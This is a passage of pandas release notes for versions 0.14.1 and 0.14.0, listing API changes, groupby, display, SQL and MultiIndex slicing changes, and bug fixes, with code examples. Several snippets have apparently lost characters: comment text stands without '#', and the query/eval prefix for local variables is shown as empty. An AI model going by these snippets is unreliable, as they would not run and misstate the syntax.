``DatetimeIndex`` (:issue:`7601`)\n- ``StringMethods`` now work on empty Series (:issue:`7242`)\n- The file parsers ``read_csv`` and ``read_table`` now ignore line comments provided by\n  the parameter ``comment``, which accepts only a single character for the C reader.\n  In particular, they allow for comments before file data begins (:issue:`2685`)\n- Add ``NotImplementedError`` for simultaneous use of ``chunksize`` and ``nrows``\n  for read_csv() (:issue:`6774`).\n- Tests for basic reading of public S3 buckets now exist (:issue:`7281`).\n- ``read_html`` now sports an ``encoding`` argument that is passed to the\n  underlying parser library. You can use this to read non-ascii encoded web\n  pages (:issue:`7323`).\n- ``read_excel`` now supports reading from URLs in the same way\n  that ``read_csv`` does.  (:issue:`6809`)\n- Support for dateutil timezones, which can now be used in the same way as\n  pytz timezones across pandas. (:issue:`4688`)\n\n  .. ipython:: python\n\n     rng = pd.date_range(\n         \"3/6/2012 00:00\", periods=10, freq=\"D\", tz=\"dateutil/Europe/London\"\n     )\n     rng.tz\n\n  See :ref:`the docs <timeseries.timezone>`.\n\n- Implemented ``sem`` (standard error of the mean) operation for ``Series``,\n  ``DataFrame``, ``Panel``, and ``Groupby`` (:issue:`6897`)\n- Add ``nlargest`` and ``nsmallest`` to the ``Series`` ``groupby`` allowlist,\n  which means you can now use these methods on a ``SeriesGroupBy`` object\n  (:issue:`7053`).\n- All offsets ``apply``, ``rollforward`` and ``rollback`` can now handle ``np.datetime64``, previously results in ``ApplyTypeError`` (:issue:`7452`)\n- ``Period`` and ``PeriodIndex`` can contain ``NaT`` in its values (:issue:`7485`)\n- Support pickling ``Series``, ``DataFrame`` and ``Panel`` objects with\n  non-unique labels along *item* axis (``index``, ``columns`` and ``items``\n  respectively) (:issue:`7370`).\n- Improved inference of datetime/timedelta with mixed null objects. Regression from 0.13.1 in interpretation of an object Index\n  with all null elements (:issue:`7431`)\n\n.. _whatsnew_0141.performance:\n\nPerformance\n~~~~~~~~~~~\n- Improvements in dtype inference for numeric operations involving yielding performance gains for dtypes: ``int64``, ``timedelta64``, ``datetime64`` (:issue:`7223`)\n- Improvements in Series.transform for significant performance gains (:issue:`6496`)\n- Improvements in DataFrame.transform with ufuncs and built-in grouper functions for significant performance gains (:issue:`7383`)\n- Regression in groupby aggregation of datetime64 dtypes (:issue:`7555`)\n- Improvements in ``MultiIndex.from_product`` for large iterables (:issue:`7627`)\n\n\n.. _whatsnew_0141.experimental:\n\nExperimental\n~~~~~~~~~~~~\n\n- ``pandas.io.data.Options`` has a new method, ``get_all_data`` method, and now consistently returns a\n  MultiIndexed ``DataFrame`` (:issue:`5602`)\n- ``io.gbq.read_gbq`` and ``io.gbq.to_gbq`` were refactored to remove the\n  dependency on the Google ``bq.py`` command line client. This submodule\n  now uses ``httplib2`` and the Google ``apiclient`` and ``oauth2client`` API client\n  libraries which should be more stable and, therefore, reliable than\n  ``bq.py``. See :ref:`the docs <io.bigquery>`. (:issue:`6937`).\n\n\n.. _whatsnew_0141.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in ``DataFrame.where`` with a symmetric shaped frame and a passed other of a DataFrame (:issue:`7506`)\n- Bug in Panel indexing with a MultiIndex axis (:issue:`7516`)\n- Regression in datetimelike slice indexing with a duplicated index and non-exact end-points (:issue:`7523`)\n- Bug in setitem with list-of-lists and single vs mixed types (:issue:`7551`:)\n- Bug in time ops with non-aligned Series (:issue:`7500`)\n- Bug in timedelta inference when assigning an incomplete Series (:issue:`7592`)\n- Bug in groupby ``.nth`` with a Series and integer-like column name (:issue:`7559`)\n- Bug in ``Series.get`` with a boolean accessor (:issue:`7407`)\n- Bug in ``value_counts`` where ``NaT`` did not qualify as missing (``NaN``) (:issue:`7423`)\n- Bug in ``to_timedelta`` that accepted invalid units and misinterpreted 'm/h' (:issue:`7611`, :issue:`6423`)\n- Bug in line plot doesn't set correct ``xlim`` if ``secondary_y=True`` (:issue:`7459`)\n- Bug in grouped ``hist`` and ``scatter`` plots use old ``figsize`` default (:issue:`7394`)\n- Bug in plotting subplots with ``DataFrame.plot``, ``hist`` clears passed ``ax`` even if the number of subplots is one (:issue:`7391`).\n- Bug in plotting subplots with ``DataFrame.boxplot`` with ``by`` kw raises ``ValueError`` if the number of subplots exceeds 1 (:issue:`7391`).\n- Bug in subplots displays ``ticklabels`` and ``labels`` in different rule (:issue:`5897`)\n- Bug in ``Panel.apply`` with a MultiIndex as an axis (:issue:`7469`)\n- Bug in ``DatetimeIndex.insert`` doesn't preserve ``name`` and ``tz`` (:issue:`7299`)\n- Bug in ``DatetimeIndex.asobject`` doesn't preserve ``name`` (:issue:`7299`)\n- Bug in MultiIndex slicing with datetimelike ranges (strings and Timestamps), (:issue:`7429`)\n- Bug in ``Index.min`` and ``max`` doesn't handle ``nan`` and ``NaT`` properly (:issue:`7261`)\n- Bug in ``PeriodIndex.min/max`` results in ``int`` (:issue:`7609`)\n- Bug in ``resample`` where ``fill_method`` was ignored if you passed ``how`` (:issue:`2073`)\n- Bug in ``TimeGrouper`` doesn't exclude column specified by ``key`` (:issue:`7227`)\n- Bug in ``DataFrame`` and ``Series`` bar and barh plot raises ``TypeError`` when ``bottom``\n  and ``left`` keyword is specified (:issue:`7226`)\n- Bug in ``DataFrame.hist`` raises ``TypeError`` when it contains non numeric column (:issue:`7277`)\n- Bug in ``Index.delete`` does not preserve ``name`` and ``freq`` attributes (:issue:`7302`)\n- Bug in ``DataFrame.query()``/``eval`` where local string variables with the \n  sign were being treated as temporaries attempting to be deleted\n  (:issue:`7300`).\n- Bug in ``Float64Index`` which didn't allow duplicates (:issue:`7149`).\n- Bug in ``DataFrame.replace()`` where truthy values were being replaced\n  (:issue:`7140`).\n- Bug in ``StringMethods.extract()`` where a single match group Series\n  would use the matcher's name instead of the group name (:issue:`7313`).\n- Bug in ``isnull()`` when ``mode.use_inf_as_null == True`` where isnull\n  wouldn't test ``True`` when it encountered an ``inf``/``-inf``\n  (:issue:`7315`).\n- Bug in inferred_freq results in None for eastern hemisphere timezones (:issue:`7310`)\n- Bug in ``Easter`` returns incorrect date when offset is negative (:issue:`7195`)\n- Bug in broadcasting with ``.div``, integer dtypes and divide-by-zero (:issue:`7325`)\n- Bug in ``CustomBusinessDay.apply`` raises ``NameError`` when ``np.datetime64`` object is passed (:issue:`7196`)\n- Bug in ``MultiIndex.append``, ``concat`` and ``pivot_table`` don't preserve timezone (:issue:`6606`)\n- Bug in ``.loc`` with a list of indexers on a single-multi index level (that is not nested) (:issue:`7349`)\n- Bug in ``Series.map`` when mapping a dict with tuple keys of different lengths (:issue:`7333`)\n- Bug all ``StringMethods`` now work on empty Series (:issue:`7242`)\n- Fix delegation of ``read_sql`` to ``read_sql_query`` when query does not contain 'select' (:issue:`7324`).\n- Bug where a string column name assignment to a ``DataFrame`` with a\n  ``Float64Index`` raised a ``TypeError`` during a call to ``np.isnan``\n  (:issue:`7366`).\n- Bug where ``NDFrame.replace()`` didn't correctly replace objects with\n  ``Period`` values (:issue:`7379`).\n- Bug in ``.ix`` getitem should always return a Series (:issue:`7150`)\n- Bug in MultiIndex slicing with incomplete indexers (:issue:`7399`)\n- Bug in MultiIndex slicing with a step in a sliced level (:issue:`7400`)\n- Bug where negative indexers in ``DatetimeIndex`` were not correctly sliced\n  (:issue:`7408`)\n- Bug where ``NaT`` wasn't repr'd correctly in a ``MultiIndex`` (:issue:`7406`,\n  :issue:`7409`).\n- Bug where bool objects were converted to ``nan`` in ``convert_objects``\n  (:issue:`7416`).\n- Bug in ``quantile`` ignoring the axis keyword argument (:issue:`7306`)\n- Bug where ``nanops._maybe_null_out`` doesn't work with complex numbers\n  (:issue:`7353`)\n- Bug in several ``nanops`` functions when ``axis==0`` for\n  1-dimensional ``nan`` arrays (:issue:`7354`)\n- Bug where ``nanops.nanmedian`` doesn't work when ``axis==None``\n  (:issue:`7352`)\n- Bug where ``nanops._has_infs`` doesn't work with many dtypes\n  (:issue:`7357`)\n- Bug in ``StataReader.data`` where reading a 0-observation dta failed (:issue:`7369`)\n- Bug in ``StataReader`` when reading Stata 13 (117) files containing fixed width strings (:issue:`7360`)\n- Bug in ``StataWriter`` where encoding was ignored (:issue:`7286`)\n- Bug in ``DatetimeIndex`` comparison doesn't handle ``NaT`` properly (:issue:`7529`)\n- Bug in passing input with ``tzinfo`` to some offsets ``apply``, ``rollforward`` or ``rollback`` resets ``tzinfo`` or raises ``ValueError`` (:issue:`7465`)\n- Bug in ``DatetimeIndex.to_period``, ``PeriodIndex.asobject``, ``PeriodIndex.to_timestamp`` doesn't preserve ``name`` (:issue:`7485`)\n- Bug in ``DatetimeIndex.to_period`` and ``PeriodIndex.to_timestamp`` handle ``NaT`` incorrectly (:issue:`7228`)\n- Bug in ``offsets.apply``, ``rollforward`` and ``rollback`` may return normal ``datetime`` (:issue:`7502`)\n- Bug in ``resample`` raises ``ValueError`` when target contains ``NaT`` (:issue:`7227`)\n- Bug in ``Timestamp.tz_localize`` resets ``nanosecond`` info (:issue:`7534`)\n- Bug in ``DatetimeIndex.asobject`` raises ``ValueError`` when it contains ``NaT`` (:issue:`7539`)\n- Bug in ``Timestamp.__new__`` doesn't preserve nanosecond properly (:issue:`7610`)\n- Bug in ``Index.astype(float)`` where it would return an ``object`` dtype\n  ``Index`` (:issue:`7464`).\n- Bug in ``DataFrame.reset_index`` loses ``tz`` (:issue:`3950`)\n- Bug in ``DatetimeIndex.freqstr`` raises ``AttributeError`` when ``freq`` is ``None`` (:issue:`7606`)\n- Bug in ``GroupBy.size`` created by ``TimeGrouper`` raises ``AttributeError`` (:issue:`7453`)\n- Bug in single column bar plot is misaligned (:issue:`7498`).\n- Bug in area plot with tz-aware time series raises ``ValueError`` (:issue:`7471`)\n- Bug in non-monotonic ``Index.union`` may preserve ``name`` incorrectly (:issue:`7458`)\n- Bug in ``DatetimeIndex.intersection`` doesn't preserve timezone (:issue:`4690`)\n- Bug in ``rolling_var`` where a window larger than the array would raise an error(:issue:`7297`)\n- Bug with last plotted timeseries dictating ``xlim`` (:issue:`2960`)\n- Bug with ``secondary_y`` axis not being considered for timeseries ``xlim`` (:issue:`3490`)\n- Bug in ``Float64Index`` assignment with a non scalar indexer (:issue:`7586`)\n- Bug in ``pandas.core.strings.str_contains`` does not properly match in a case insensitive fashion when ``regex=False`` and ``case=False`` (:issue:`7505`)\n- Bug in ``expanding_cov``, ``expanding_corr``, ``rolling_cov``, and ``rolling_corr`` for two arguments with mismatched index  (:issue:`7512`)\n- Bug in ``to_sql`` taking the boolean column as text column (:issue:`7678`)\n- Bug in grouped ``hist`` doesn't handle ``rot`` kw and ``sharex`` kw properly (:issue:`7234`)\n- Bug in ``.loc`` performing fallback integer indexing with ``object`` dtype indices (:issue:`7496`)\n- Bug (regression) in ``PeriodIndex`` constructor when passed ``Series`` objects (:issue:`7701`).\n\n\n.. _whatsnew_0.14.1.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.14.0..v0.14.1\n\n\n.. _whatsnew_0140:\n\nVersion 0.14.0 (May 31 , 2014)\n------------------------------\n\n{{ header }}\n\n\nThis is a major release from 0.13.1 and includes a small number of API changes, several new features,\nenhancements, and performance improvements along with a large number of bug fixes. We recommend that all\nusers upgrade to this version.\n\n- Highlights include:\n\n  - Officially support Python 3.4\n  - SQL interfaces updated to use ``sqlalchemy``, See :ref:`Here<whatsnew_0140.sql>`.\n  - Display interface changes, See :ref:`Here<whatsnew_0140.display>`\n  - MultiIndexing Using Slicers, See :ref:`Here<whatsnew_0140.slicers>`.\n  - Ability to join a singly-indexed DataFrame with a MultiIndexed DataFrame, see :ref:`Here <merging.join_on_mi>`\n  - More consistency in groupby results and more flexible groupby specifications, See :ref:`Here<whatsnew_0140.groupby>`\n  - Holiday calendars are now supported in ``CustomBusinessDay``, see :ref:`Here <timeseries.holiday>`\n  - Several improvements in plotting functions, including: hexbin, area and pie plots, see :ref:`Here<whatsnew_0140.plotting>`.\n  - Performance doc section on I/O operations, See :ref:`Here <io.perf>`\n\n- :ref:`Other Enhancements <whatsnew_0140.enhancements>`\n\n- :ref:`API Changes <whatsnew_0140.api>`\n\n- :ref:`Text Parsing API Changes <whatsnew_0140.parsing>`\n\n- :ref:`Groupby API Changes <whatsnew_0140.groupby>`\n\n- :ref:`Performance Improvements <whatsnew_0140.performance>`\n\n- :ref:`Prior Deprecations <whatsnew_0140.prior_deprecations>`\n\n- :ref:`Deprecations <whatsnew_0140.deprecations>`\n\n- :ref:`Known Issues <whatsnew_0140.knownissues>`\n\n- :ref:`Bug Fixes <whatsnew_0140.bug_fixes>`\n\n.. warning::\n\n   In 0.14.0 all ``NDFrame`` based containers have undergone significant internal refactoring. Before that each block of\n   homogeneous data had its own labels and extra care was necessary to keep those in sync with the parent container's labels.\n   This should not have any visible user/API behavior changes (:issue:`6745`)\n\n.. _whatsnew_0140.api:\n\nAPI changes\n~~~~~~~~~~~\n\n- ``read_excel`` uses 0 as the default sheet (:issue:`6573`)\n- ``iloc`` will now accept out-of-bounds indexers for slices, e.g. a value that exceeds the length of the object being\n  indexed. These will be excluded. This will make pandas conform more with python/numpy indexing of out-of-bounds\n  values. A single indexer that is out-of-bounds and drops the dimensions of the object will still raise\n  ``IndexError`` (:issue:`6296`, :issue:`6299`). This could result in an empty axis (e.g. an empty DataFrame being returned)\n\n  .. ipython:: python\n\n     dfl = pd.DataFrame(np.random.randn(5, 2), columns=list('AB'))\n     dfl\n     dfl.iloc[:, 2:3]\n     dfl.iloc[:, 1:3]\n     dfl.iloc[4:6]\n\n  These are out-of-bounds selections\n\n  .. code-block:: python\n\n     >>> dfl.iloc[[4, 5, 6]]\n     IndexError: positional indexers are out-of-bounds\n\n     >>> dfl.iloc[:, 4]\n     IndexError: single positional indexer is out-of-bounds\n\n- Slicing with negative start, stop & step values handles corner cases better (:issue:`6531`):\n\n  - ``df.iloc[:-len(df)]`` is now empty\n  - ``df.iloc[len(df)::-1]`` now enumerates all elements in reverse\n\n- The :meth:`DataFrame.interpolate` keyword ``downcast`` default has been changed from ``infer`` to\n  ``None``. This is to preserve the original dtype unless explicitly requested otherwise (:issue:`6290`).\n- When converting a dataframe to HTML it used to return ``Empty DataFrame``. This special case has\n  been removed, instead a header with the column names is returned (:issue:`6062`).\n- ``Series`` and ``Index`` now internally share more common operations, e.g. ``factorize(),nunique(),value_counts()`` are\n  now supported on ``Index`` types as well. The ``Series.weekday`` property from is removed\n  from Series for API consistency. Using a ``DatetimeIndex/PeriodIndex`` method on a Series will now raise a ``TypeError``.\n  (:issue:`4551`, :issue:`4056`, :issue:`5519`, :issue:`6380`, :issue:`7206`).\n\n- Add ``is_month_start``, ``is_month_end``, ``is_quarter_start``, ``is_quarter_end``, ``is_year_start``, ``is_year_end`` accessors for ``DateTimeIndex`` / ``Timestamp`` which return a boolean array of whether the timestamp(s) are at the start/end of the month/quarter/year defined by the frequency of the ``DateTimeIndex`` / ``Timestamp`` (:issue:`4565`, :issue:`6998`)\n\n- Local variable usage has changed in\n  :func:`pandas.eval`/:meth:`DataFrame.eval`/:meth:`DataFrame.query`\n  (:issue:`5987`). For the :class:`~pandas.DataFrame` methods, two things have\n  changed\n\n  - Column names are now given precedence over locals\n  - Local variables must be referred to explicitly. This means that even if\n    you have a local variable that is *not* a column you must still refer to\n    it with the ``''`` prefix.\n  - You can have an expression like ``df.query('a < a')`` with no complaints\n    from ``pandas`` about ambiguity of the name ``a``.\n  - The top-level :func:`pandas.eval` function does not allow you use the\n    ``''`` prefix and provides you with an error message telling you so.\n  - ``NameResolutionError`` was removed because it isn't necessary anymore.\n\n- Define and document the order of column vs index names in query/eval (:issue:`6676`)\n- ``concat`` will now concatenate mixed Series and DataFrames using the Series name\n  or numbering columns as needed (:issue:`2385`). See :ref:`the docs <merging.mixed_ndims>`\n- Slicing and advanced/boolean indexing operations on ``Index`` classes as well\n  as :meth:`Index.delete` and :meth:`Index.drop` methods will no longer change the type of the\n  resulting index (:issue:`6440`, :issue:`7040`)\n\n  .. ipython:: python\n\n     i = pd.Index([1, 2, 3, 'a', 'b', 'c'])\n     i[[0, 1, 2]]\n     i.drop(['a', 'b', 'c'])\n\n  Previously, the above operation would return ``Int64Index``.  If you'd like\n  to do this manually, use :meth:`Index.astype`\n\n  .. ipython:: python\n\n     i[[0, 1, 2]].astype(np.int_)\n\n- ``set_index`` no longer converts MultiIndexes to an Index of tuples. For example,\n  the old behavior returned an Index in this case (:issue:`6459`):\n\n  .. ipython:: python\n     :suppress:\n\n     np.random.seed(1234)\n     from itertools import product\n     tuples = list(product(('a', 'b'), ('c', 'd')))\n     mi = pd.MultiIndex.from_tuples(tuples)\n     df_multi = pd.DataFrame(np.random.randn(4, 2), index=mi)\n     tuple_ind = pd.Index(tuples, tupleize_cols=False)\n     df_multi.index\n\n  .. ipython:: python\n\n      Old behavior, casted MultiIndex to an Index\n     tuple_ind\n     df_multi.set_index(tuple_ind)\n\n      New behavior\n     mi\n     df_multi.set_index(mi)\n\n  This also applies when passing multiple indices to ``set_index``:\n\n  .. ipython:: python\n\n    suppress\n    df_multi.index = tuple_ind\n\n     Old output, 2-level MultiIndex of tuples\n    df_multi.set_index([df_multi.index, df_multi.index])\n\n    suppress\n    df_multi.index = mi\n\n     New output, 4-level MultiIndex\n    df_multi.set_index([df_multi.index, df_multi.index])\n\n- ``pairwise`` keyword was added to the statistical moment functions\n  ``rolling_cov``, ``rolling_corr``, ``ewmcov``, ``ewmcorr``,\n  ``expanding_cov``, ``expanding_corr`` to allow the calculation of moving\n  window covariance and correlation matrices (:issue:`4950`). See\n  :ref:`Computing rolling pairwise covariances and correlations\n  <window.corr_pairwise>` in the docs.\n\n  .. code-block:: ipython\n\n     In [1]: df = pd.DataFrame(np.random.randn(10, 4), columns=list('ABCD'))\n\n     In [4]: covs = pd.rolling_cov(df[['A', 'B', 'C']],\n       ....:                       df[['B', 'C', 'D']],\n       ....:                       5,\n       ....:                       pairwise=True)\n\n\n     In [5]: covs[df.index[-1]]\n     Out[5]:\n               B         C         D\n     A  0.035310  0.326593 -0.505430\n     B  0.137748 -0.006888 -0.005383\n     C -0.006888  0.861040  0.020762\n\n- ``Series.iteritems()`` is now lazy (returns an iterator rather than a list). This was the documented behavior prior to 0.14. (:issue:`6760`)\n\n- Added ``nunique`` and ``value_counts`` functions to ``Index`` for counting unique elements. (:issue:`6734`)\n- ``stack`` and ``unstack`` now raise a ``ValueError`` when the ``level`` keyword refers\n  to a non-unique item in the ``Index`` (previously raised a ``KeyError``). (:issue:`6738`)\n- drop unused order argument from ``Series.sort``; args now are in the same order as ``Series.order``;\n  add ``na_position`` arg to conform to ``Series.order`` (:issue:`6847`)\n- default sorting algorithm for ``Series.order`` is now ``quicksort``, to conform with ``Series.sort``\n  (and numpy defaults)\n- add ``inplace`` keyword to ``Series.order/sort`` to make them inverses (:issue:`6859`)\n- ``DataFrame.sort`` now places NaNs at the beginning or end of the sort according to the ``na_position`` parameter. (:issue:`3917`)\n- accept ``TextFileReader`` in ``concat``, which was affecting a common user idiom (:issue:`6583`), this was a regression\n  from 0.13.1\n- Added ``factorize`` functions to ``Index`` and ``Series`` to get indexer and unique values (:issue:`7090`)\n- ``describe`` on a DataFrame with a mix of Timestamp and string like objects returns a different Index (:issue:`7088`).\n  Previously the index was unintentionally sorted.\n- Arithmetic operations with **only** ``bool`` dtypes now give a warning indicating\n  that they are evaluated in Python space for ``+``, ``-``,\n  and ``*`` operations and raise for all others (:issue:`7011`, :issue:`6762`,\n  :issue:`7015`, :issue:`7210`)\n\n  .. code-block:: python\n\n     >>> x = pd.Series(np.random.rand(10) > 0.5)\n     >>> y = True\n     >>> x + y   warning generated: should do x | y instead\n     UserWarning: evaluating in Python space because the '+' operator is not\n     supported by numexpr for the bool dtype, use '|' instead\n     >>> x / y   this raises because it doesn't make sense\n     NotImplementedError: operator '/' not implemented for bool dtypes\n\n- In ``HDFStore``, ``select_as_multiple`` will always raise a ``KeyError``, when a key or the selector is not found (:issue:`6177`)\n- ``df['col'] = value`` and ``df.loc[:,'col'] = value`` are now completely equivalent;\n  previously the ``.loc`` would not necessarily coerce the dtype of the resultant series (:issue:`6149`)\n- ``dtypes`` and ``ftypes`` now return a series with ``dtype=object`` on empty containers (:issue:`5740`)\n- ``df.to_csv`` will now return a string of the CSV data if neither a target path nor a buffer is provided\n  (:issue:`6061`)\n- ``pd.infer_freq()`` will now raise a ``TypeError`` if given an invalid ``Series/Index``\n  type (:issue:`6407`, :issue:`6463`)\n- A tuple passed to ``DataFame.sort_index`` will be interpreted as the levels of\n  the index, rather than requiring a list of tuple (:issue:`4370`)\n- all offset operations now return ``Timestamp`` types (rather than datetime), Business/Week frequencies were incorrect (:issue:`4069`)\n- ``to_excel`` now converts ``np.inf`` into a string representation,\n  customizable by the ``inf_rep`` keyword argument (Excel has no native inf\n  representation) (:issue:`6782`)\n- Replace ``pandas.compat.scipy.scoreatpercentile`` with ``numpy.percentile`` (:issue:`6810`)\n- ``.quantile`` on a ``datetime[ns]`` series now returns ``Timestamp`` instead\n  of ``np.datetime64`` objects (:issue:`6810`)\n- change ``AssertionError`` to ``TypeError`` for invalid types passed to ``concat`` (:issue:`6583`)\n- Raise a ``TypeError`` when ``DataFrame`` is passed an iterator as the\n  ``data`` argument (:issue:`5357`)\n\n\n.. _whatsnew_0140.display:\n\nDisplay changes\n~~~~~~~~~~~~~~~\n\n- The default way of printing large DataFrames has changed. DataFrames\n  exceeding ``max_rows`` and/or ``max_columns`` are now displayed in a\n  centrally truncated view, consistent with the printing of a\n  :class:`pandas.Series` (:issue:`5603`).\n\n  In previous versions, a DataFrame was truncated once the dimension\n  constraints were reached and an ellipse (...) signaled that part of\n  the data was cut off.\n\n  .. image:: ../_static/trunc_before.png\n      :alt: The previous look of truncate.\n\n  In the current version, large DataFrames are centrally truncated,\n  showing a preview of head and tail in both dimensions.\n\n  .. image:: ../_static/trunc_after.png\n     :alt: The new look.\n\n- allow option ``'truncate'`` for ``display.show_dimensions`` to only show the dimensions if the\n  frame is truncated (:issue:`6547`).\n\n  The default for ``display.show_dimensions`` will now be ``truncate``. This is consistent with\n  how Series display length.\n\n  .. ipython:: python\n\n     dfd = pd.DataFrame(np.arange(25).reshape(-1, 5),\n                        index=[0, 1, 2, 3, 4],\n                        columns=[0, 1, 2, 3, 4])\n\n      show dimensions since this is truncated\n     with pd.option_context('display.max_rows', 2, 'display.max_columns', 2,\n                            'display.show_dimensions', 'truncate'):\n         print(dfd)\n\n      will not show dimensions since it is not truncated\n     with pd.option_context('display.max_rows', 10, 'display.max_columns', 40,\n                            'display.show_dimensions', 'truncate'):\n         print(dfd)\n\n- Regression in the display of a MultiIndexed Series with ``display.max_rows`` is less than the\n  length of the series (:issue:`7101`)\n- Fixed a bug in the HTML repr of a truncated Series or DataFrame not showing the class name with the\n  ``large_repr`` set to 'info' (:issue:`7105`)\n- The ``verbose`` keyword in ``DataFrame.info()``, which controls whether to shorten the ``info``\n  representation, is now ``None`` by default. This will follow the global setting in\n  ``display.max_info_columns``. The global setting can be overridden with ``verbose=True`` or\n  ``verbose=False``.\n- Fixed a bug with the ``info`` repr not honoring the ``display.max_info_columns`` setting (:issue:`6939`)\n- Offset/freq info now in Timestamp __repr__ (:issue:`4553`)\n\n.. _whatsnew_0140.parsing:\n\nText parsing API changes\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n:func:`read_csv`/:func:`read_table` will now be noisier w.r.t invalid options rather than falling back to the ``PythonParser``.\n\n- Raise ``ValueError`` when ``sep`` specified with\n  ``delim_whitespace=True`` in :func:`read_csv`/:func:`read_table`\n  (:issue:`6607`)\n- Raise ``ValueError`` when ``engine='c'`` specified with unsupported\n  options in :func:`read_csv`/:func:`read_table` (:issue:`6607`)\n- Raise ``ValueError`` when fallback to python parser causes options to be\n  ignored (:issue:`6607`)\n- Produce :class:`~pandas.io.parsers.ParserWarning` on fallback to python\n  parser when no options are ignored (:issue:`6607`)\n- Translate ``sep='\\s+'`` to ``delim_whitespace=True`` in\n  :func:`read_csv`/:func:`read_table` if no other C-unsupported options\n  specified (:issue:`6607`)\n\n.. _whatsnew_0140.groupby:\n\nGroupBy API changes\n~~~~~~~~~~~~~~~~~~~\n\nMore consistent behavior for some groupby methods:\n\n- groupby ``head`` and ``tail`` now act more like ``filter`` rather than an aggregation:\n\n  .. code-block:: ipython\n\n     In [1]: df = pd.DataFrame([[1, 2], [1, 4], [5, 6]], columns=['A', 'B'])\n\n     In [2]: g = df.groupby('A')\n\n     In [3]: g.head(1)   filters DataFrame\n     Out[3]:\n        A  B\n     0  1  2\n     2  5  6\n\n     In [4]: g.apply(lambda x: x.head(1))   used to simply fall-through\n     Out[4]:\n          A  B\n     A\n     1 0  1  2\n     5 2  5  6\n\n- groupby head and tail respect column selection:\n\n  .. code-block:: ipython\n\n     In [19]: g[['B']].head(1)\n     Out[19]:\n        B\n     0  2\n     2  6\n\n     [2 rows x 1 columns]\n\n- groupby ``nth`` now reduces by default; filtering can be achieved by passing ``as_index=False``. With an optional ``dropna`` argument to ignore\n  NaN. See :ref:`the docs <groupby.nth>`.\n\n  Reducing\n\n  .. ipython:: python\n\n     df = pd.DataFrame([[1, np.nan], [1, 4], [5, 6]], columns=['A', 'B'])\n     g = df.groupby('A')\n     g.nth(0)\n\n      this is equivalent to g.first()\n     g.nth(0, dropna='any')\n\n      this is equivalent to g.last()\n     g.nth(-1, dropna='any')\n\n  Filtering\n\n  .. ipython:: python\n\n     gf = df.groupby('A', as_index=False)\n     gf.nth(0)\n     gf.nth(0, dropna='any')\n\n- groupby will now not return the grouped column for non-cython functions (:issue:`5610`, :issue:`5614`, :issue:`6732`),\n  as its already the index\n\n  .. ipython:: python\n\n     df = pd.DataFrame([[1, np.nan], [1, 4], [5, 6], [5, 8]], columns=['A', 'B'])\n     g = df.groupby('A')\n     g.count()\n     g.describe()\n\n- passing ``as_index`` will leave the grouped column in-place (this is not change in 0.14.0)\n\n  .. ipython:: python\n\n     df = pd.DataFrame([[1, np.nan], [1, 4], [5, 6], [5, 8]], columns=['A', 'B'])\n     g = df.groupby('A', as_index=False)\n     g.count()\n     g.describe()\n\n- Allow specification of a more complex groupby via ``pd.Grouper``, such as grouping\n  by a Time and a string field simultaneously. See :ref:`the docs <groupby.specify>`. (:issue:`3794`)\n\n- Better propagation/preservation of Series names when performing groupby\n  operations:\n\n  - ``SeriesGroupBy.agg`` will ensure that the name attribute of the original\n    series is propagated to the result (:issue:`6265`).\n  - If the function provided to ``GroupBy.apply`` returns a named series, the\n    name of the series will be kept as the name of the column index of the\n    DataFrame returned by ``GroupBy.apply`` (:issue:`6124`).  This facilitates\n    ``DataFrame.stack`` operations where the name of the column index is used as\n    the name of the inserted column containing the pivoted data.\n\n\n.. _whatsnew_0140.sql:\n\nSQL\n~~~\n\nThe SQL reading and writing functions now support more database flavors\nthrough SQLAlchemy (:issue:`2717`, :issue:`4163`, :issue:`5950`, :issue:`6292`).\nAll databases supported by SQLAlchemy can be used, such\nas PostgreSQL, MySQL, Oracle, Microsoft SQL server (see documentation of\nSQLAlchemy on `included dialects\n<https://sqlalchemy.readthedocs.io/en/latest/dialects/index.html>`_).\n\nThe functionality of providing DBAPI connection objects will only be supported\nfor sqlite3 in the future. The ``'mysql'`` flavor is deprecated.\n\nThe new functions :func:`~pandas.read_sql_query` and :func:`~pandas.read_sql_table`\nare introduced. The function :func:`~pandas.read_sql` is kept as a convenience\nwrapper around the other two and will delegate to specific function depending on\nthe provided input (database table name or sql query).\n\nIn practice, you have to provide a SQLAlchemy ``engine`` to the sql functions.\nTo connect with SQLAlchemy you use the :func:`create_engine` function to create an engine\nobject from database URI. You only need to create the engine once per database you are\nconnecting to. For an in-memory sqlite database:\n\n.. ipython:: python\n\n   from sqlalchemy import create_engine\n    Create your connection.\n   engine = create_engine('sqlite:///:memory:')\n\nThis ``engine`` can then be used to write or read data to/from this database:\n\n.. ipython:: python\n\n    df = pd.DataFrame({'A': [1, 2, 3], 'B': ['a', 'b', 'c']})\n    df.to_sql(name='db_table', con=engine, index=False)\n\nYou can read data from a database by specifying the table name:\n\n.. ipython:: python\n\n   pd.read_sql_table('db_table', engine)\n\nor by specifying a sql query:\n\n.. ipython:: python\n\n   pd.read_sql_query('SELECT * FROM db_table', engine)\n\nSome other enhancements to the sql functions include:\n\n- support for writing the index. This can be controlled with the ``index``\n  keyword (default is True).\n- specify the column label to use when writing the index with ``index_label``.\n- specify string columns to parse as datetimes with the ``parse_dates``\n  keyword in :func:`~pandas.read_sql_query` and :func:`~pandas.read_sql_table`.\n\n.. warning::\n\n    Some of the existing functions or function aliases have been deprecated\n    and will be removed in future versions. This includes: ``tquery``, ``uquery``,\n    ``read_frame``, ``frame_query``, ``write_frame``.\n\n.. warning::\n\n    The support for the 'mysql' flavor when using DBAPI connection objects has been deprecated.\n    MySQL will be further supported with SQLAlchemy engines (:issue:`6900`).\n\n\n.. _whatsnew_0140.slicers:\n\nMulti-indexing using slicers\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIn 0.14.0 we added a new way to slice MultiIndexed objects.\nYou can slice a MultiIndex by providing multiple indexers.\n\nYou can provide any of the selectors as if you are indexing by label, see :ref:`Selection by Label <indexing.label>`,\nincluding slices, lists of labels, labels, and boolean indexers.\n\nYou can use ``slice(None)`` to select all the contents of *that* level. You do not need to specify all the\n*deeper* levels, they will be implied as ``slice(None)``.\n\nAs usual, **both sides** of the slicers are included as this is label indexing.\n\nSee :ref:`the docs<advanced.mi_slicers>`\nSee also issues (:issue:`6134`, :issue:`4036`, :issue:`3057`, :issue:`2598`, :issue:`5641`, :issue:`7106`)\n\n.. warning::\n\n   You should specify all axes in the ``.loc`` specifier, meaning the indexer for the **index** and\n   for the **columns**. Their are some ambiguous 